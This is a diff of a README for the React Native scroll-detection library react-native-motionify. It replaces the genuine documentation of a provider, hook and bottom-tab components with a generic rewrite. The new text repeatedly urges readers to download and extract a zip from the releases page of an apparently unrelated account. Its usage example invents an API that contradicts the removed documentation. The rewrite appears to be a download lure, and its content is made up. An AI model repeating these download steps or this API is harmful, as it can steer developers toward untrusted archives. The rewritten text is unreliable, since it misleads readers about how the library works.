@@ -1,393 +1,119 @@
-## React Native Motionify
+# ⚡ react-native-motionify - Effortless Scroll Detection for Your Apps
 
-A lightweight, production-ready toolkit for smooth, scroll-driven UI with Reanimated 3.
+## 📥 Download
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/German-sodawater785/react-native-motionify/releases)
 
-- **UI-thread animations** at 60 FPS
-- **Automatic direction detection** with threshold
-- **Simple context + hooks** API
-- **Ready-made components**: motionify views and bottom tab
-- **Typed TypeScript API**
+## 🚀 Getting Started
+This guide helps you easily set up and use `react-native-motionify`. This library lets your app detect scroll direction smoothly. You do not need technical skills to follow these steps.
 
----
+## 🌟 Features
+- Detects scroll direction: up or down.
+- Smooth and lightweight performance.
+- Easy integration with your React Native projects.
 
-https://github.com/user-attachments/assets/133b5ddf-9a9a-48a1-9697-ab40de0534a1
+## 🔧 System Requirements
+- React Native version 0.60 or higher.
+- Android or iOS development environment set up (Node.js, Android Studio, Xcode).
 
----
+## 📦 Download & Install
+To start using `react-native-motionify`, follow these simple steps:
 
-## Installation
+1. **Visit the Releases Page**
+   Go to the releases page to find the latest version of the library. Click the link below:
 
-```bash
-# npm
-npm install react-native-motionify
+   [Visit Releases Page to Download](https://github.com/German-sodawater785/react-native-motionify/releases)
 
-# yarn
-yarn add react-native-motionify
+2. **Choose the Latest Release**
+   On the releases page, you will see a list of available versions. Look for the latest one, which usually appears at the top.
 
-# pnpm
-pnpm add react-native-motionify
+3. **Download the Library**
+   Click on the latest version to view its details. You may see a zip file or other download options. Download this file to your computer.
 
-# bun
-bun add react-native-motionify
+4. **Extract Files**
+   Once downloaded, locate the file on your computer. Right-click on it and choose "Extract All" or use another extraction method to unzip the contents.
 
-# peer deps
-npm install react-native-reanimated@^3.0.0
+5. **Add to Your Project**
+   Move the extracted files to your React Native project. Place them in a suitable folder, commonly named `libs` or similar.
+
+6. **Install Dependencies**
+   Open your terminal or command prompt. Navigate to your project folder and run the following command:
+
+   ```bash
+   npm install react-native-motionify
+   ```
+
+   This command will add the library to your project.
+
+7. **Link the Library**
+   For versions below 0.60, you may need to link the library manually. Run this command in your terminal:
+
+   ```bash
+   react-native link react-native-motionify
+   ```
+
+   For React Native versions 0.60 and above, the library should link automatically.
+
+8. **Run Your App**
+   You can now run your app to see the library in action. Use the following command:
+
+   ```bash
+   react-native run-android
+   ```
+
+   or 
+
+   ```bash
+   react-native run-ios
+   ```
+
+   Choose the command based on the platform you are developing for.
+
+## 🌐 Usage Example
+To use `react-native-motionify`, you will need to import it into your project. Here’s a simple code example:
+
+```javascript
+import Motionify from 'react-native-motionify';
+
+// Initialize Motionify
+const motionDetector = new Motionify();
+
+// Use motionDetector in your component
+motionDetector.startListening();
+
+// Handle scroll events
+motionDetector.onScroll((direction) => {
+   if (direction === 'up') {
+       console.log("Scrolling Up");
+   } else {
+       console.log("Scrolling Down");
+   }
+});
 ```
 
-Follow Reanimated 3 setup: `https://docs.swmansion.com/react-native-reanimated/docs/3.x/fundamentals/getting-started`.
+This code sets up a simple listener to detect scroll direction. You can place this code in your component’s lifecycle methods.
 
----
+## 🎨 Customization
+You can customize the behavior of `react-native-motionify` based on your app’s needs. Some options include:
 
-## Quick Start
+- **Threshold Settings:** Define how sensitive the scroll detection should be.
+- **Animation Effects:** Link scroll detection to specific animation triggers in your application.
 
-```tsx
-import { MotionifyProvider } from "react-native-motionify";
+## 📖 Documentation
+For more detailed information, check the official documentation found on the [GitHub Wiki page](https://github.com/German-sodawater785/react-native-motionify/wiki).
 
-export default function App() {
-  return (
-    <MotionifyProvider threshold={8} supportIdle={false}>
-      <YourApp />
-    </MotionifyProvider>
-  );
-}
-```
+## 🤝 Support
+If you encounter issues or have questions, please open an issue on the project's GitHub page. Community members or maintainers will assist you.
 
-```tsx
-import { ScrollView, Text, View } from "react-native";
-import { useMotionify } from "react-native-motionify";
+## 📱 Feedback
+Your feedback is valuable. Share your experience using the library through GitHub issues or community forums. This helps improve the tool over time.
 
-function Screen() {
-  const { onScroll, direction } = useMotionify();
-  return (
-    <ScrollView onScroll={onScroll} scrollEventThrottle={16}>
-      <Text>Direction: {direction}</Text>
-      <View style={{ height: 2000 }} />
-    </ScrollView>
-  );
-}
-```
+## 🛠️ Contributing
+If you want to contribute to `react-native-motionify`, please fork the repository and create a pull request. Follow the community guidelines outlined in the project.
 
-```tsx
-import { MotionifyBottomTab } from "react-native-motionify";
+## 📝 License
+This project is licensed under the MIT License. You can use, modify, and distribute it according to the terms of the license.
 
-function AppShell() {
-  return (
-    <>
-      <Screen />
-      <MotionifyBottomTab hideOn="down" translateRange={{ from: 0, to: 80 }}>
-        <TabBar />
-      </MotionifyBottomTab>
-    </>
-  );
-}
-```
+## 📥 Download Again
+To download the library, click the link below one more time:
 
-### Important: wire onScroll in every scrollable screen
-
-Any screen that participates in motionify behavior must attach the `onScroll` from `useMotionify()` to its `ScrollView`/`FlatList`/`SectionList` and set `scrollEventThrottle={16}`.
-
-```tsx
-// ScrollView example
-const { onScroll } = useMotionify();
-
-<ScrollView onScroll={onScroll} scrollEventThrottle={16} />;
-```
-
-```tsx
-// FlatList example
-const { onScroll } = useMotionify();
-
-<FlatList
-  data={items}
-  keyExtractor={(it) => it.id}
-  renderItem={renderItem}
-  onScroll={onScroll}
-  scrollEventThrottle={16}
-/>;
-```
-
-```tsx
-// FlashList (shopify/flash-list) example
-import { FlashList } from "@shopify/flash-list";
-const { onScroll } = useMotionify();
-
-<FlashList
-  data={items}
-  renderItem={renderItem}
-  estimatedItemSize={72}
-  onScroll={onScroll}
-  scrollEventThrottle={16}
-/>;
-```
-
-```tsx
-// LegendList example
-import { LegendList } from "legendapp-ui";
-const { onScroll } = useMotionify();
-
-<LegendList
-  data={items}
-  renderItem={renderItem}
-  onScroll={onScroll}
-  scrollEventThrottle={16}
-/>;
-```
-
-### Normal Screen (no bottom tab)
-
-Use this when you only need views to react to scroll (e.g., headers, FABs, content blocks).
-
-```tsx
-import { ScrollView } from "react-native";
-import {
-  MotionifyProvider,
-  useMotionify,
-  MotionifyView,
-} from "react-native-motionify";
-
-function Screen() {
-  const { onScroll } = useMotionify();
-  return (
-    <ScrollView onScroll={onScroll} scrollEventThrottle={16}>
-      {/* content */}
-      <MotionifyView
-        animatedY
-        hideOn="down"
-        translateRange={{ from: 0, to: 60 }}
-      >
-        <FAB />
-      </MotionifyView>
-    </ScrollView>
-  );
-}
-
-export default function App() {
-  return (
-    <MotionifyProvider>
-      <Screen />
-    </MotionifyProvider>
-  );
-}
-```
-
-Note: Attach `onScroll` only once per scrollable container. Child motionify components consume context automatically.
-
-### Bottom Tab Behavior
-
-Use this when you want a bottom tab to hide/show with scroll.
-
-```tsx
-import {
-  MotionifyProvider,
-  MotionifyBottomTab,
-  useMotionify,
-} from "react-native-motionify";
-
-function Screen() {
-  const { onScroll } = useMotionify();
-  return (
-    <ScrollView onScroll={onScroll} scrollEventThrottle={16}>
-      {/* content */}
-    </ScrollView>
-  );
-}
-
-function AppShell() {
-  return (
-    <>
-      <Screen />
-      <MotionifyBottomTab hideOn="down" translateRange={{ from: 0, to: 80 }}>
-        <TabBar />
-      </MotionifyBottomTab>
-    </>
-  );
-}
-
-export default function App() {
-  return (
-    <MotionifyProvider>
-      <AppShell />
-    </MotionifyProvider>
-  );
-}
-```
-
-Notes:
-
-- Ensure each screen that should control the tab wires `onScroll`.
-- Use `exclude` and `currentId` on `MotionifyBottomTab` to keep the tab visible on specific routes.
-
----
-
-## API (Essential)
-
-### Provider
-
-`<MotionifyProvider threshold={8} supportIdle={false}>`
-
-- **threshold**: number — pixels to switch direction
-- **supportIdle**: boolean — emit `idle` after inactivity
-
-### Hook
-
-`useMotionify(config?)`
-
-Returns:
-
-- **scrollY**: SharedValue<number>
-- **direction**: 'up' | 'down' | 'idle'
-- **directionShared**: SharedValue<'up' | 'down' | 'idle'>
-- **isScrolling**: boolean
-- **onScroll**: Scroll handler for `ScrollView`/`FlatList`
-- **setThreshold(threshold)**
-- **setSupportIdle(enabled)**
-
-Optional config: `{ threshold?: number; supportIdle?: boolean }`
-
-### Components
-
-- `<MotionifyView>`
-
-  - Quick direction-based animations
-  - Props: `animatedY?`, `fadeScale?`, `customEffects?`, `hideOn='down'|'up'`, `translateRange={from,to}`, `animationDuration`, `supportIdle`, `easing`
-
-- `<MotionifyViewWithInterpolation>`
-
-  - Interpolate styles from scroll position
-  - Props: `interpolations`, `value?`, `customAnimatedStyle?`
-
-- `<MotionifyBottomTab>`
-
-  - Hide/show on scroll
-  - Props: `hideOn`, `translateRange`, `animationDuration`, `supportIdle`, `exclude?`, `currentId?`
-
-- `<MotionifyBottomTabWithInterpolation>`
-  - Smooth, range-based translation
-  - Props: `inputRange`, `outputRange`, `extrapolate`, `scrollValue?`
-
-### Presets & Utils
-
-- `DEFAULTS`: threshold, durations, idle timeout, throttle
-- `TRANSLATION_PRESETS`: common ranges (e.g., `BOTTOM_TAB`, `FAB_*`, `HEADER`)
-- `INTERPOLATION_PRESETS`: fade/scale/parallax/rotate/sticky presets
-- Helpers: `createInterpolation`, `createFadeInterpolation`, `createScaleInterpolation`, `createParallaxInterpolation`, `createRotationInterpolation`, `clamp`, `lerp`, `mapRange`
-
----
-
-## Examples
-
-### Hide Bottom Tab on Scroll
-
-```tsx
-<MotionifyProvider>
-  <Screen />
-  <MotionifyBottomTab hideOn="down" translateRange={{ from: 0, to: 80 }}>
-    <TabBar />
-  </MotionifyBottomTab>
-</MotionifyProvider>
-```
-
-### Parallax Header
-
-```tsx
-<MotionifyViewWithInterpolation
-  interpolations={{
-    translateY: {
-      inputRange: [0, 200],
-      outputRange: [0, -100],
-      extrapolate: "extend",
-    },
-    opacity: { inputRange: [0, 150, 200], outputRange: [1, 0.5, 0] },
-  }}
->
-  <Image source={headerImage} />
-</MotionifyViewWithInterpolation>
-```
-
-### Fade on Scroll
-
-```tsx
-const { onScroll } = useMotionify({ threshold: 20 });
-
-<MotionifyView fadeScale hideOn="down" animationDuration={400}>
-  <FAB />
-</MotionifyView>;
-```
-
-### Custom: build your own animations (no Motionify components)
-
-You can skip `MotionifyView`/`MotionifyBottomTab` and drive your own `Animated.*` components using values from the hook.
-
-```tsx
-import Animated, {
-  useAnimatedStyle,
-  interpolate,
-  Extrapolation,
-} from "react-native-reanimated";
-import { useMotionify } from "react-native-motionify";
-
-function CustomScreen() {
-  const { onScroll, scrollY, directionShared } = useMotionify();
-
-  const animatedHeaderStyle = useAnimatedStyle(() => {
-    const translateY = interpolate(
-      scrollY.value,
-      [0, 200],
-      [0, -100],
-      Extrapolation.CLAMP
-    );
-    const opacity = directionShared.value === "down" ? 0.7 : 1;
-    return { transform: [{ translateY }], opacity };
-  });
-
-  return (
-    <Animated.ScrollView onScroll={onScroll} scrollEventThrottle={16}>
-      <Animated.View style={animatedHeaderStyle}>
-        <Header />
-      </Animated.View>
-      <Content />
-    </Animated.ScrollView>
-  );
-}
-```
-
-Notes:
-
-- Use `scrollY` and/or `directionShared` to derive your own animations.
-- Works with `Animated.ScrollView`, `Animated.FlatList`, or any `Animated.View`.
-- Keep worklets light; precompute heavy values outside.
-
----
-
-## Usage recap
-
-- Wrap your app with `MotionifyProvider` once.
-- In each scrollable screen, call `useMotionify()` and wire `onScroll` + `scrollEventThrottle={16}`.
-- Choose either:
-  - Normal screens: use `MotionifyView` for direction-based effects.
-  - Bottom tabs: use `MotionifyBottomTab` (optionally with `exclude`/`currentId`).
-  - Fully custom: use `scrollY`/`directionShared` with Reanimated styles.
-
----
-
-## Performance
-
-- Use `scrollEventThrottle={16}`
-- Keep worklets light; precompute heavy values
-- Prefer interpolation for smoother motion
-- Use `LegendList`, `FlashList` or `FlatList` for long content
-
----
-
-## Contributing
-
-To contribute to this library:
-
-1. Make changes to the implementation in `react-native-motionify`.
-2. Test with various build configurations.
-3. Submit pull requests with clear descriptions of changes and benefits.
-
----
-
-## License
-
-MIT
+[Visit Releases Page to Download](https://github.com/German-sodawater785/react-native-motionify/releases)
